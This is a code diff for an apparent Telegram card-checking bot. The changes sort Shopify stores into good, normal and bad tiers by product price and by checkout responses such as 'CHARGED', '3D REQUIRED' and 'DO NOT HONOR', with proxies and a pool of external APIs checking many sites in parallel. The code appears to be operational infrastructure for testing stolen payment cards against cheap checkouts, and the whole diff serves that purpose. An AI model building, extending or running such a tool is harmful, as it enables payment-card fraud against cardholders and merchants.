+                price_match = re.search(r'"Price":\s*(\d+\.?\d*)', response_text, re.IGNORECASE)
+                if price_match:
+                    try:
+                        price = float(price_match.group(1))
+                        print(f"💰 [SITE QUALITY] Extracted price from JSON: ${price:.2f}")
+                    except:
+                        pass
+            
+            # Check for "price": in JSON
+            if price is None:
+                price_match = re.search(r'"price":\s*(\d+\.?\d*)', response_text, re.IGNORECASE)
+                if price_match:
+                    try:
+                        price = float(price_match.group(1))
+                        print(f"💰 [SITE QUALITY] Extracted price from JSON (lowercase): ${price:.2f}")
+                    except:
+                        pass
+        
+        # Valid response indicators
         valid_indicators = [
             "CHARGED", "ORDER COMPLETED", "ORDER_PLACED", "PAID", "SUCCESS",
             "OTP_REQUIRED", "3D REQUIRED", "OTP", "3D", "SECURE", "AUTHENTICATION",
@@ -60231,57 +60425,83 @@ class SiteQualityTracker:
             "CARD_DECLINED", "DECLINED", "DO NOT HONOR", "GENERIC_ERROR",
             "RISK_DISALLOWED", "EXISTING_ACCOUNT_RESTRICTED",
             "APPROVED", "AUTHORIZED", "COMPLETED", "CAPTURED",
-            "ORDER_PLACED", "TRANSACTION_COMPLETED"
+            "ORDER_PLACED", "TRANSACTION_COMPLETED",
+            # These are also valid responses
+            "MERCHANDISE_EXPECTED_PRICE_MISMATCH",
+            "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED",
+            "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH",
+            "VALIDATION_CUSTOM"
         ]
         
         is_valid_response = any(indicator in response_upper for indicator in valid_indicators)
         
-        # ============ PRICE MUST BE UNDER $5 TO BE GOOD ============
-        is_cheap_price = price is not None and price < 5
-        
-        # ============ ONLY MARK AS GOOD IF: valid response AND price UNDER $5 ============
-        if is_valid_response and is_cheap_price:
-            self.good_sites.add(site)
-            stats['is_good'] = True
-            stats['good_responses'] += 1
-            if price is not None:
-                self.price_cache[site] = price
-            print(f"🌟 [SITE QUALITY] GOOD site: {site} (${price:.2f}) - {response_text[:40]}")
-        
-        # ============ VALID RESPONSE BUT PRICE >= $5 = NOT GOOD ============
-        elif is_valid_response and price is not None and price >= 5:
-            print(f"📌 [SITE QUALITY] NOT GOOD: {site} - Price ${price:.2f} (need < $5) - {response_text[:40]}")
-            stats['bad_responses'] += 1
-            
-            # Remove from good_sites if present
-            if site in self.good_sites:
-                self.good_sites.remove(site)
-                stats['is_good'] = False
-                print(f"🗑️ [SITE QUALITY] Removed {site} from GOOD (price ${price:.2f} >= $5)")
-        
-        # ============ VALID RESPONSE BUT NO PRICE INFO ============
-        elif is_valid_response and price is None:
-            # Check if response indicates a successful transaction
-            if "ORDER_PLACED" in response_upper or "CHARGED" in response_upper:
-                # Assume it's GOOD with a default price of 1.00
+        # ============ CATEGORIZE BY PRICE ============
+        if is_valid_response and price is not None:
+            if price < 5:
+                # GOOD site - under $5
                 self.good_sites.add(site)
+                self.normal_sites.discard(site)
                 stats['is_good'] = True
+                stats['is_normal'] = False
+                stats['good_responses'] += 1
+                if site in self.bad_sites:
+                    self.bad_sites.discard(site)
+                print(f"🌟 [GOOD] {site} (${price:.2f}) - {response_text[:40]}")
+                
+            elif 5 <= price < 10:
+                # NORMAL site - $5-$10 (backup)
+                self.normal_sites.add(site)
+                self.good_sites.discard(site)
+                stats['is_good'] = False
+                stats['is_normal'] = True
+                stats['normal_responses'] += 1
+                if site in self.bad_sites:
+                    self.bad_sites.discard(site)
+                print(f"📌 [NORMAL] {site} (${price:.2f}) - {response_text[:40]}")
+                
+            else:
+                # BAD site - over $10
+                self.bad_sites.add(site)
+                self.good_sites.discard(site)
+                self.normal_sites.discard(site)
+                stats['is_good'] = False
+                stats['is_normal'] = False
+                stats['bad_responses'] += 1
+                print(f"❌ [BAD] {site} (${price:.2f}) - Price too high")
+        
+        elif is_valid_response and price is None:
+            # No price info - check if it's a Shopify store with valid response
+            if "ORDER_PLACED" in response_upper or "CHARGED" in response_upper:
+                # Assume GOOD with default price
+                self.good_sites.add(site)
+                self.normal_sites.discard(site)
+                stats['is_good'] = True
+                stats['is_normal'] = False
                 stats['good_responses'] += 1
                 self.price_cache[site] = 1.00
-                print(f"🌟 [SITE QUALITY] GOOD site: {site} ($1.00 estimated) - {response_text[:40]}")
+                print(f"🌟 [GOOD] {site} ($1.00 estimated) - {response_text[:40]}")
+            elif ".myshopify.com" in site or "shopify" in response_text.lower():
+                # It's a Shopify store but no price - assume NORMAL
+                self.normal_sites.add(site)
+                self.good_sites.discard(site)
+                stats['is_good'] = False
+                stats['is_normal'] = True
+                stats['normal_responses'] += 1
+                self.price_cache[site] = 5.00
+                print(f"📌 [NORMAL] {site} ($5.00 estimated - Shopify store) - {response_text[:40]}")
             else:
                 stats['bad_responses'] += 1
                 if site in self.good_sites:
-                    self.good_sites.remove(site)
-                    stats['is_good'] = False
+                    self.good_sites.discard(site)
+                if site in self.normal_sites:
+                    self.normal_sites.discard(site)
         
-        # ============ INVALID RESPONSE - NOT GOOD ============
         elif not is_valid_response:
             stats['bad_responses'] += 1
             if site in self.good_sites:
-                self.good_sites.remove(site)
-                stats['is_good'] = False
-                print(f"⚠️ [SITE QUALITY] Removed {site} from GOOD - Invalid response: {response_text[:40]}")
+                self.good_sites.discard(site)
+            if site in self.normal_sites:
+                self.normal_sites.discard(site)
         
         # Auto-save every 50 responses
         if stats['total_responses'] % 50 == 0:
@@ -60296,91 +60516,160 @@ class SiteQualityTracker:
         price = self.get_site_price(site)
         if price >= 5:
             self.good_sites.remove(site)
-            print(f"🗑️ [SITE QUALITY] Auto-removed {site} from GOOD - price ${price:.2f} >= $5")
+            if 5 <= price < 10:
+                self.normal_sites.add(site)
+            print(f"🔄 [SITE QUALITY] Moved {site} from GOOD to NORMAL (${price:.2f})")
             self.save_stats()
             return False
         
         return True
     
-    def get_site_price(self, site: str) -> float:
-        """Get the lowest price for a site"""
-        if site in self.price_cache:
-            return self.price_cache[site]
-        if site in self.site_quality:
-            return self.site_quality[site].get('lowest_price', 0)
-        return 0
+    def is_normal_site(self, site: str) -> bool:
+        """Check if site is marked as NORMAL (price $5-$10)"""
+        if site not in self.normal_sites:
+            return False
+        
+        # Double-check price is still in range
+        price = self.get_site_price(site)
+        if price >= 10:
+            self.normal_sites.remove(site)
+            print(f"🗑️ [SITE QUALITY] Removed {site} from NORMAL (${price:.2f} >= $10)")
+            self.save_stats()
+            return False
+        if price < 5:
+            self.normal_sites.remove(site)
+            self.good_sites.add(site)
+            print(f"🔄 [SITE QUALITY] Moved {site} from NORMAL to GOOD (${price:.2f})")
+            self.save_stats()
+            return False
+        
+        return True
+    
+    def get_good_sites(self) -> List[str]:
+        """Get all GOOD sites (under $5)"""
+        return list(self.good_sites)
+    
+    def get_normal_sites(self) -> List[str]:
+        """Get all NORMAL sites ($5-$10)"""
+        return list(self.normal_sites)
+    
+    def get_bad_sites(self) -> List[str]:
+        """Get all BAD sites (over $10)"""
+        return list(self.bad_sites)
     
     def get_good_sites_sorted_by_price(self) -> List[str]:
-        """
-        Get all GOOD sites sorted by price (lowest first)
-        ONLY sites with price UNDER $5
-        """
+        """Get GOOD sites sorted by price (lowest first)"""
         good_sites_with_prices = []
-        
         for site in list(self.good_sites):
             price = self.get_site_price(site)
-            
-            # Skip if price is over $5
             if price >= 5:
-                self.good_sites.remove(site)
-                print(f"🗑️ [SITE QUALITY] Auto-removed {site} from GOOD - price ${price:.2f} >= $5")
+                self.good_sites.discard(site)
+                if 5 <= price < 10:
+                    self.normal_sites.add(site)
                 continue
-            
             if price > 0 and price < 5:
                 good_sites_with_prices.append((site, price))
             elif price == 0:
-                # If no price data, treat as GOOD with default price (1.00)
                 good_sites_with_prices.append((site, 1.00))
                 self.price_cache[site] = 1.00
         
-        # Sort by price (lowest first)
         good_sites_with_prices.sort(key=lambda x: x[1])
-        
         return [site for site, _ in good_sites_with_prices]
     
-    def get_site_price_rank(self, site: str) -> int:
-        """Get the price rank of a site (lower price = better rank)"""
-        sorted_sites = self.get_good_sites_sorted_by_price()
-        try:
-            return sorted_sites.index(site) + 1
-        except ValueError:
-            return len(sorted_sites) + 1
-    
-    def get_all_good_sites(self) -> List[str]:
-        """Get all GOOD sites (price UNDER $5)"""
-        # Clean up first
-        for site in list(self.good_sites):
+    def get_normal_sites_sorted_by_price(self) -> List[str]:
+        """Get NORMAL sites sorted by price (lowest first)"""
+        normal_sites_with_prices = []
+        for site in list(self.normal_sites):
             price = self.get_site_price(site)
-            if price >= 5:
-                self.good_sites.remove(site)
-        return list(self.good_sites)
+            if price < 5:
+                self.normal_sites.discard(site)
+                self.good_sites.add(site)
+                continue
+            if 5 <= price < 10:
+                normal_sites_with_prices.append((site, price))
+        
+        normal_sites_with_prices.sort(key=lambda x: x[1])
+        return [site for site, _ in normal_sites_with_prices]
+    
+    def get_all_sites_sorted(self) -> List[Tuple[str, str, float]]:
+        """
+        Get all sites with their category and price sorted by category then price.
+        Returns: [(site, category, price), ...]
+        """
+        all_sites = []
+        
+        # GOOD sites (under $5)
+        for site in self.good_sites:
+            price = self.get_site_price(site)
+            if price < 5:
+                all_sites.append((site, 'good', price))
+        
+        # NORMAL sites ($5-$10)
+        for site in self.normal_sites:
+            price = self.get_site_price(site)
+            if 5 <= price < 10:
+                all_sites.append((site, 'normal', price))
+        
+        # BAD sites (over $10 or unknown)
+        for site in self.site_quality:
+            if site not in self.good_sites and site not in self.normal_sites:
+                price = self.get_site_price(site)
+                if price > 0:
+                    all_sites.append((site, 'bad', price))
+                else:
+                    all_sites.append((site, 'unknown', 0))
+        
+        # Sort: GOOD first (by price), then NORMAL (by price), then BAD
+        priority = {'good': 0, 'normal': 1, 'bad': 2, 'unknown': 3}
+        all_sites.sort(key=lambda x: (priority.get(x[1], 3), x[2]))
+        return all_sites
     
     def get_site_stats(self, site: str) -> dict:
         """Get stats for a specific site"""
         return self.site_quality.get(site, {})
     
+    def get_site_category(self, site: str) -> str:
+        """Get the category of a site: 'good', 'normal', 'bad', or 'unknown'"""
+        if site in self.good_sites:
+            return 'good'
+        if site in self.normal_sites:
+            return 'normal'
+        if site in self.bad_sites:
+            return 'bad'
+        return 'unknown'
+    
+    def get_site_category_emoji(self, site: str) -> str:
+        """Get emoji for site category"""
+        category = self.get_site_category(site)
+        if category == 'good':
+            return '🌟'
+        elif category == 'normal':
+            return '📌'
+        elif category == 'bad':
+            return '❌'
+        else:
+            return '❓'
+    
     def force_mark_good(self, site: str, price: float = 1.00):
-        """
-        Force mark a site as GOOD - ONLY if price is UNDER $5.
-        If price >= $5, it will NOT be marked as GOOD.
-        """
-        # ============ ENFORCE PRICE CHECK ============
+        """Force mark a site as GOOD - ONLY if price is UNDER $5."""
         if price >= 5:
-            print(f"⚠️ [SITE QUALITY] Refusing to mark {site} as GOOD - price ${price:.2f} is >= $5")
-            # Remove from good_sites if present
+            print(f"⚠️ [SITE QUALITY] Refusing to mark {site} as GOOD - price ${price:.2f} >= $5")
             if site in self.good_sites:
                 self.good_sites.remove(site)
-                print(f"🗑️ [SITE QUALITY] Removed {site} from GOOD (price ${price:.2f} >= $5)")
+            if 5 <= price < 10:
+                self.normal_sites.add(site)
             self.save_stats()
             return
         
         # Price is under $5 - mark as GOOD
         self.good_sites.add(site)
+        self.normal_sites.discard(site)
         self.price_cache[site] = price
         
         if site not in self.site_quality:
             self.site_quality[site] = {
                 'good_responses': 1,
+                'normal_responses': 0,
                 'bad_responses': 0,
                 'total_responses': 1,
                 'last_price': price,
@@ -60391,12 +60680,14 @@ class SiteQualityTracker:
                 'last_time': time.time(),
                 'all_responses': ['Force marked GOOD'],
                 'is_good': True,
+                'is_normal': False,
                 'price_history': [price],
                 'first_seen': time.time(),
                 'last_seen': time.time()
             }
         else:
             self.site_quality[site]['is_good'] = True
+            self.site_quality[site]['is_normal'] = False
             self.site_quality[site]['good_responses'] += 1
             self.site_quality[site]['lowest_price'] = min(
                 self.site_quality[site].get('lowest_price', price), 
@@ -60407,17 +60698,69 @@ class SiteQualityTracker:
         self.save_stats()
         print(f"🌟 [SITE QUALITY] Force marked GOOD: {site} (${price:.2f})")
     
+    def force_mark_normal(self, site: str, price: float = 7.00):
+        """Force mark a site as NORMAL - ONLY if price is $5-$10."""
+        if price < 5:
+            print(f"⚠️ [SITE QUALITY] Price ${price:.2f} is under $5 - marking as GOOD instead")
+            self.force_mark_good(site, price)
+            return
+        if price >= 10:
+            print(f"⚠️ [SITE QUALITY] Refusing to mark {site} as NORMAL - price ${price:.2f} >= $10")
+            if site in self.normal_sites:
+                self.normal_sites.remove(site)
+            self.save_stats()
+            return
+        
+        # Price is in $5-$10 range - mark as NORMAL
+        self.normal_sites.add(site)
+        self.good_sites.discard(site)
+        self.price_cache[site] = price
+        
+        if site not in self.site_quality:
+            self.site_quality[site] = {
+                'good_responses': 0,
+                'normal_responses': 1,
+                'bad_responses': 0,
+                'total_responses': 1,
+                'last_price': price,
+                'avg_price': price,
+                'prices': [price],
+                'lowest_price': price,
+                'last_status': 'Force marked NORMAL',
+                'last_time': time.time(),
+                'all_responses': ['Force marked NORMAL'],
+                'is_good': False,
+                'is_normal': True,
+                'price_history': [price],
+                'first_seen': time.time(),
+                'last_seen': time.time()
+            }
+        else:
+            self.site_quality[site]['is_good'] = False
+            self.site_quality[site]['is_normal'] = True
+            self.site_quality[site]['normal_responses'] += 1
+            self.site_quality[site]['lowest_price'] = min(
+                self.site_quality[site].get('lowest_price', price), 
+                price
+            )
+            self.site_quality[site]['last_price'] = price
+        
+        self.save_stats()
+        print(f"📌 [SITE QUALITY] Force marked NORMAL: {site} (${price:.2f})")
+    
     def get_stats_summary(self) -> str:
         """Get formatted summary of all site stats"""
         all_sites = list(self.site_quality.keys())
         good_sites = self.get_good_sites_sorted_by_price()
+        normal_sites = self.get_normal_sites_sorted_by_price()
         
-        if not good_sites and not all_sites:
+        if not good_sites and not normal_sites and not all_sites:
             return "📋 No sites tracked yet."
         
         result = "🌟 <b>SITE QUALITY SUMMARY</b>\n\n"
         result += f"📊 Total sites tracked: {len(all_sites)}\n"
         result += f"🌟 GOOD sites (under $5): {len(good_sites)}\n"
+        result += f"📌 NORMAL sites ($5-$10): {len(normal_sites)}\n"
         
         # Show GOOD sites
         if good_sites:
@@ -60431,41 +60774,19 @@ class SiteQualityTracker:
             if len(good_sites) > 20:
                 result += f"\n... and {len(good_sites) - 20} more\n"
         
-        # Show expensive sites (not GOOD)
-        expensive_sites = []
-        for site in all_sites:
-            if site not in good_sites:
+        # Show NORMAL sites
+        if normal_sites:
+            result += f"\n<b>📌 NORMAL Sites ($5-$10):</b>\n"
+            for i, site in enumerate(normal_sites[:20], 1):
                 price = self.get_site_price(site)
-                if price > 0:
-                    expensive_sites.append((site, price))
-        
-        if expensive_sites:
-            expensive_sites.sort(key=lambda x: x[1])
-            result += f"\n📌 <b>Expensive Sites (NOT GOOD - over $5):</b>\n"
-            for site, price in expensive_sites[:10]:
                 stats = self.get_site_stats(site)
                 total = stats.get('total_responses', 0)
-                result += f"   • <code>{site}</code> - ${price:.2f} ({total} checks)\n"
-            if len(expensive_sites) > 10:
-                result += f"   ... and {len(expensive_sites) - 10} more\n"
+                normal = stats.get('normal_responses', 0)
+                result += f"{i}. <code>{site}</code> - ${price:.2f} ({normal}/{total} normal)\n"
+            if len(normal_sites) > 20:
+                result += f"\n... and {len(normal_sites) - 20} more\n"
         
         return result
-    
-    def clean_expensive_sites(self) -> int:
-        """Remove all sites with price >= $5 from GOOD list"""
-        removed = 0
-        for site in list(self.good_sites):
-            price = self.get_site_price(site)
-            if price >= 5:
-                self.good_sites.remove(site)
-                removed += 1
-                print(f"🗑️ [CLEAN] Removed expensive site: {site} (${price:.2f})")
-        
-        if removed > 0:
-            self.save_stats()
-            print(f"🧹 Cleaned {removed} expensive sites from GOOD list")
-        
-        return removed
     
     def get_site_count(self) -> int:
         """Get total number of tracked sites"""
@@ -60475,61 +60796,18 @@ class SiteQualityTracker:
         """Get number of GOOD sites"""
         return len(self.good_sites)
     
-    def save_stats(self):
-        """Save site quality stats to file"""
-        try:
-            # Clean up before saving
-            for site in list(self.good_sites):
-                price = self.get_site_price(site)
-                if price >= 5:
-                    self.good_sites.remove(site)
-                    print(f"🗑️ [SITE QUALITY] Cleaned {site} from GOOD (price ${price:.2f} >= $5)")
-            
-            data = {
-                'good_sites': list(self.good_sites),
-                'bad_sites': list(self.bad_sites),
-                'site_quality': self.site_quality,
-                'price_cache': self.price_cache,
-                'timestamp': time.time()
-            }
-            with open('site_quality.json', 'w') as f:
-                json.dump(data, f, indent=2)
-            print(f"💾 Saved site quality stats: {len(self.good_sites)} good sites (under $5)")
-        except Exception as e:
-            print(f"⚠️ Error saving site quality: {e}")
+    def get_normal_count(self) -> int:
+        """Get number of NORMAL sites"""
+        return len(self.normal_sites)
     
-    def load_stats(self):
-        """Load site quality stats from file"""
-        if Path('site_quality.json').exists():
-            try:
-                with open('site_quality.json', 'r') as f:
-                    data = json.load(f)
-                    self.good_sites = set(data.get('good_sites', []))
-                    self.bad_sites = set(data.get('bad_sites', []))
-                    self.site_quality = data.get('site_quality', {})
-                    self.price_cache = data.get('price_cache', {})
-                
-                # Clean up on load
-                cleaned = 0
-                for site in list(self.good_sites):
-                    price = self.get_site_price(site)
-                    if price >= 5:
-                        self.good_sites.remove(site)
-                        cleaned += 1
-                
-                if cleaned > 0:
-                    self.save_stats()
-                    print(f"🧹 Cleaned {cleaned} expensive sites from GOOD list")
-                
-                print(f"📊 Loaded site quality stats: {len(self.good_sites)} good sites (under $5)")
-            except Exception as e:
-                print(f"⚠️ Error loading site quality: {e}")
-        else:
-            print(f"📋 No site_quality.json found, starting fresh")
+    def get_bad_count(self) -> int:
+        """Get number of BAD sites"""
+        return len(self.bad_sites)
     
     def reset_stats(self):
         """Reset all stats (admin only)"""
         self.good_sites = set()
+        self.normal_sites = set()
         self.bad_sites = set()
         self.site_quality = {}
         self.price_cache = {}
@@ -60540,6 +60818,8 @@ class SiteQualityTracker:
         """Remove a site from all tracking"""
         if site in self.good_sites:
             self.good_sites.remove(site)
+        if site in self.normal_sites:
+            self.normal_sites.remove(site)
         if site in self.bad_sites:
             self.bad_sites.remove(site)
         if site in self.site_quality:
@@ -60550,22 +60830,52 @@ class SiteQualityTracker:
         print(f"🗑️ Removed site from tracking: {site}")
         return True
     
+    def clean_expensive_sites(self) -> int:
+        """Remove all sites with price >= $10 from GOOD/NORMAL lists"""
+        removed = 0
+        for site in list(self.good_sites):
+            price = self.get_site_price(site)
+            if price >= 5:
+                self.good_sites.remove(site)
+                if 5 <= price < 10:
+                    self.normal_sites.add(site)
+                else:
+                    self.bad_sites.add(site)
+                removed += 1
+                print(f"🗑️ [CLEAN] Removed expensive site from GOOD: {site} (${price:.2f})")
+        
+        for site in list(self.normal_sites):
+            price = self.get_site_price(site)
+            if price >= 10:
+                self.normal_sites.remove(site)
+                self.bad_sites.add(site)
+                removed += 1
+                print(f"🗑️ [CLEAN] Removed expensive site from NORMAL: {site} (${price:.2f})")
+        
+        if removed > 0:
+            self.save_stats()
+            print(f"🧹 Cleaned {removed} expensive sites")
+        
+        return removed
+    
     def get_site_quality_report(self) -> Dict:
         """Get a full report of all sites"""
         report = {
             'total_sites': len(self.site_quality),
             'good_sites': len(self.good_sites),
+            'normal_sites': len(self.normal_sites),
             'bad_sites': len(self.bad_sites),
             'sites': {}
         }
         
         for site, stats in self.site_quality.items():
             report['sites'][site] = {
-                'is_good': site in self.good_sites,
+                'category': self.get_site_category(site),
                 'lowest_price': stats.get('lowest_price', 0),
                 'avg_price': stats.get('avg_price', 0),
                 'total_responses': stats.get('total_responses', 0),
                 'good_responses': stats.get('good_responses', 0),
+                'normal_responses': stats.get('normal_responses', 0),
                 'bad_responses': stats.get('bad_responses', 0),
                 'last_status': stats.get('last_status', '')[:100],
                 'last_seen': stats.get('last_seen', 0)
@@ -60576,6 +60886,8 @@ class SiteQualityTracker:
 
 # Create global instance
 site_quality_tracker = SiteQualityTracker()
+
+
 
 
 
@@ -60686,10 +60998,13 @@ CHKADD_API_POOL = [
     },
 ]
 
+# ============ COMPLETE CHKADD API POOL MANAGER ============
+
 class ChkaddAPIPoolManager:
     """
     Manages the API pool for /chkadd command.
     Each API checks one site at a time, running up to 13 sites in parallel.
+    Properly categorizes sites as GOOD (under $5), NORMAL ($5-$10), or BAD (over $10).
     """
     
     def __init__(self):
@@ -60772,8 +61087,9 @@ class ChkaddAPIPoolManager:
     
     async def check_site_with_api(self, site: str, api: dict, proxy: str = None) -> Tuple[bool, float, str, dict]:
         """
-        Check a single site with a specific API
-        Returns: (is_good, price, response_text, data)
+        Check a single site with a specific API.
+        Returns: (is_working, price, response_text, data)
+        is_working: True for GOOD (under $5) or NORMAL ($5-$10), False for BAD (over $10) or errors
         """
         start_time = time.time()
         
@@ -60805,20 +61121,38 @@ class ChkaddAPIPoolManager:
                 try:
                     data = response.json()
                     response_text = data.get("Response", data.get("message", data.get("status", "UNKNOWN")))
-                    price = data.get("Price", data.get("price", 0))
                     
-                    # Parse price
+                    # ============ FIX: Extract price correctly ============
+                    price_raw = data.get("Price", data.get("price", data.get("amount", 0)))
+                    
+                    # Parse price - handle various formats
                     try:
-                        if isinstance(price, str):
-                            price = float(price.replace('$', '').replace('USD', '').strip())
+                        if isinstance(price_raw, str):
+                            # Remove currency symbols and convert
+                            price_clean = price_raw.replace('$', '').replace('USD', '').replace('GBP', '').replace('EUR', '').strip()
+                            price = float(price_clean)
                         else:
-                            price = float(price)
-                    except:
+                            price = float(price_raw)
+                    except (ValueError, TypeError):
                         price = 0
                     
                     response_upper = response_text.upper()
                     
-                    # Check for GOOD responses (products under $5)
+                    # ============ CHECK FOR SITE REMOVAL ERRORS ============
+                    site_removal_errors = [
+                        "SUBMIT REJECTED", "No products under $10", "No products under $10 ound!",
+                        "Site not supported", "Not Shopify!", "NO VARIANTS",
+                        "PAYMENTS_INVALID_GATEWAY_FOR_DEVELOPMENT_STORE",
+                        "NO_SESSION_TOKEN", "SITE DEAD", "PROXY DEAD"
+                    ]
+                    
+                    for error in site_removal_errors:
+                        if error.upper() in response_upper:
+                            print(f"🗑️ [CHKADD] Site removal error: {error} for {site_clean}")
+                            self.mark_api_result(api["name"], False, elapsed)
+                            return False, 0, f"{error}", data
+                    
+                    # ============ CHECK FOR GOOD RESPONSES ============
                     GOOD_RESPONSES = [
                         "CHARGED", "ORDER COMPLETED", "ORDER_PLACED", "PAID", "SUCCESS",
                         "CAPTURED", "TRANSACTION_COMPLETED", "COMPLETED",
@@ -60830,38 +61164,84 @@ class ChkaddAPIPoolManager:
                         "APPROVED", "AUTHORIZED"
                     ]
                     
-                    BAD_RESPONSES = [
-                        "Site not supported", "Site Error! Status: 404", "Invalid site URL",
-                        "No products under", "No products under $10", "No valid products found",
-                        "SITE DEAD", "PROXY DEAD", "UNKNOWN GATEWAY", "GATEWAY UNKNOWN",
-                        "Connection error", "Timeout", "EMPTY_RESPONSE"
-                    ]
+                    # ============ CHECK IF RESPONSE INDICATES A WORKING SITE ============
+                    is_valid_response = any(good in response_upper for good in GOOD_RESPONSES)
                     
-                    is_bad = any(bad in response_upper for bad in BAD_RESPONSES)
+                    # Check for price mismatch errors (still a valid Shopify site)
+                    if not is_valid_response:
+                        if "MERCHANDISE_EXPECTED_PRICE_MISMATCH" in response_upper:
+                            # This means the site is Shopify but price mismatch - still a valid site
+                            # Try to extract price from the error
+                            price_match = re.search(r'price[\s]*\$?(\d+\.?\d*)', response_text, re.IGNORECASE)
+                            if price_match:
+                                try:
+                                    price = float(price_match.group(1))
+                                    print(f"💰 [CHKADD] Extracted price from error: ${price:.2f}")
+                                except:
+                                    pass
+                            is_valid_response = True
+                        
+                        elif "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED" in response_upper:
+                            # This is a valid Shopify store with delivery issues
+                            is_valid_response = True
+                        
+                        elif "PAYMENTS_CREDIT_CARD_BASE_EXPIRED" in response_upper:
+                            # Valid Shopify store with card expiry response
+                            is_valid_response = True
+                        
+                        elif "GENERIC_ERROR" in response_upper:
+                            # Generic error but still a valid Shopify site
+                            is_valid_response = True
                     
-                    if is_bad:
-                        self.mark_api_result(api["name"], False, elapsed)
-                        return False, 0, response_text, data
+                    # ============ CATEGORIZE SITE BY PRICE ============
+                    if is_valid_response and price > 0:
+                        if price < 5:
+                            # GOOD site - under $5
+                            self.mark_api_result(api["name"], True, elapsed)
+                            print(f"🌟 [CHKADD] GOOD: {site_clean} (${price:.2f})")
+                            return True, price, f"GOOD - ${price:.2f}", data
+                        elif 5 <= price < 10:
+                            # NORMAL site - $5-$10 (backup)
+                            self.mark_api_result(api["name"], True, elapsed)
+                            print(f"📌 [CHKADD] NORMAL: {site_clean} (${price:.2f})")
+                            return True, price, f"NORMAL - ${price:.2f}", data
+                        else:
+                            # BAD site - over $10
+                            self.mark_api_result(api["name"], True, elapsed)
+                            print(f"❌ [CHKADD] BAD: {site_clean} - Price ${price:.2f} >= $5")
+                            return False, price, f"BAD - ${price:.2f}", data
                     
-                    is_good = any(good in response_upper for good in GOOD_RESPONSES)
-                    
-                    if is_good and price > 0 and price < 5:
+                    elif is_valid_response and price == 0:
+                        # Valid response but no price - check if it's a Shopify store
+                        if "shopify" in response_text.lower() or ".myshopify.com" in site_clean:
+                            # Assume it's GOOD with default price
+                            self.mark_api_result(api["name"], True, elapsed)
+                            print(f"🌟 [CHKADD] GOOD (estimated): {site_clean} ($1.00)")
+                            return True, 1.00, "GOOD - estimated $1.00", data
+                        else:
+                            self.mark_api_result(api["name"], True, elapsed)
+                            return False, 0, "Valid response but no price data", data
+                    else:
+                        # Check if it's a valid Shopify store even with error response
+                        if ".myshopify.com" in site_clean or "shopify" in response_text.lower():
+                            # Still a valid Shopify store, mark as NORMAL with default price
+                            self.mark_api_result(api["name"], True, elapsed)
+                            print(f"📌 [CHKADD] NORMAL (Shopify store): {site_clean} ($5.00 estimated)")
+                            return True, 5.00, "NORMAL - Shopify store (estimated $5.00)", data
+                        
                         self.mark_api_result(api["name"], True, elapsed)
-                        return True, price, response_text, data
-                    elif is_good and price >= 5:
-                        self.mark_api_result(api["name"], True, elapsed)
-                        return False, price, f"Price ${price:.2f} >= $5", data
-                    elif is_good:
-                        self.mark_api_result(api["name"], True, elapsed)
-                        return False, 0, "Good response but no price data", data
-                    
-                    self.mark_api_result(api["name"], True, elapsed)
-                    return False, 0, response_text[:100], data
-                    
+                        return False, 0, response_text[:100], data
+                        
                 except json.JSONDecodeError:
                     self.mark_api_result(api["name"], False, elapsed)
                     return False, 0, "Invalid JSON response", {}
             else:
+                # Check if it's a 429 rate limit - should retry later
+                if response.status_code == 429:
+                    print(f"🚫 [CHKADD] Rate limit (429) for {site_clean}")
+                    self.mark_api_result(api["name"], False, elapsed)
+                    return False, 0, f"HTTP {response.status_code} - Rate limit", {}
+                
                 self.mark_api_result(api["name"], False, elapsed)
                 return False, 0, f"HTTP {response.status_code}", {}
                 
@@ -60876,11 +61256,13 @@ class ChkaddAPIPoolManager:
         """
         Check multiple sites in parallel using the API pool.
         Each site gets a different API.
+        Returns: dict with 'good', 'normal', 'bad', and 'error' lists
         """
         results = {
-            "good": [],
-            "bad": [],
-            "error": []
+            "good": [],    # Under $5
+            "normal": [],  # $5-$10
+            "bad": [],     # Over $10
+            "error": []    # Errors
         }
         
         if not sites:
@@ -60899,11 +61281,11 @@ class ChkaddAPIPoolManager:
                 # Get next API for this site
                 api = await self.get_next_api()
                 
-                is_good, price, response, data = await self.check_site_with_api(site, api, proxy)
+                is_working, price, response, data = await self.check_site_with_api(site, api, proxy)
                 
                 return {
                     "site": site,
-                    "is_good": is_good,
+                    "is_working": is_working,
                     "price": price,
                     "response": response,
                     "data": data,
@@ -60914,7 +61296,7 @@ class ChkaddAPIPoolManager:
         # Create tasks for all sites
         tasks = [process_site(site, idx) for idx, site in enumerate(sites)]
         
-        # Process in parallel with timeout (90 seconds per site)
+        # Process in parallel with timeout (120 seconds per site)
         try:
             async with asyncio.timeout(120):
                 completed = await asyncio.gather(*tasks, return_exceptions=True)
@@ -60934,24 +61316,45 @@ class ChkaddAPIPoolManager:
         # Process results
         for result in valid_results:
             site = result["site"]
-            is_good = result["is_good"]
+            is_working = result["is_working"]
             price = result["price"]
             response = result["response"]
             
-            if is_good:
-                results["good"].append({
-                    "site": site,
-                    "price": price,
-                    "response": response
-                })
-                print(f"✅ [CHKADD] GOOD: {site} (${price:.2f})")
+            if is_working:
+                if price < 5:
+                    results["good"].append({
+                        "site": site,
+                        "price": price,
+                        "response": response
+                    })
+                    print(f"🌟 [CHKADD] GOOD: {site} (${price:.2f})")
+                elif 5 <= price < 10:
+                    results["normal"].append({
+                        "site": site,
+                        "price": price,
+                        "response": response
+                    })
+                    print(f"📌 [CHKADD] NORMAL: {site} (${price:.2f})")
+                else:
+                    results["bad"].append({
+                        "site": site,
+                        "price": price,
+                        "response": response[:80]
+                    })
+                    print(f"❌ [CHKADD] BAD: {site} - {response[:50]}")
             else:
-                results["bad"].append({
+                results["error"].append({
                     "site": site,
-                    "price": price,
-                    "response": response[:80]
+                    "error": response[:80]
                 })
-                print(f"❌ [CHKADD] BAD: {site} - {response[:50]}")
+                print(f"⚠️ [CHKADD] ERROR: {site} - {response[:50]}")
+        
+        # Print summary
+        print(f"\n📊 [CHKADD] Batch complete:")
+        print(f"   🌟 GOOD: {len(results['good'])}")
+        print(f"   📌 NORMAL: {len(results['normal'])}")
+        print(f"   ❌ BAD: {len(results['bad'])}")
+        print(f"   ⚠️ ERRORS: {len(results['error'])}")
         
         return results
     
@@ -61077,9 +61480,7 @@ async def chkadd_command_enhanced(update: Update, context: ContextTypes.DEFAULT_
     
     await process_chkadd_enhanced(update, context, sites)
 
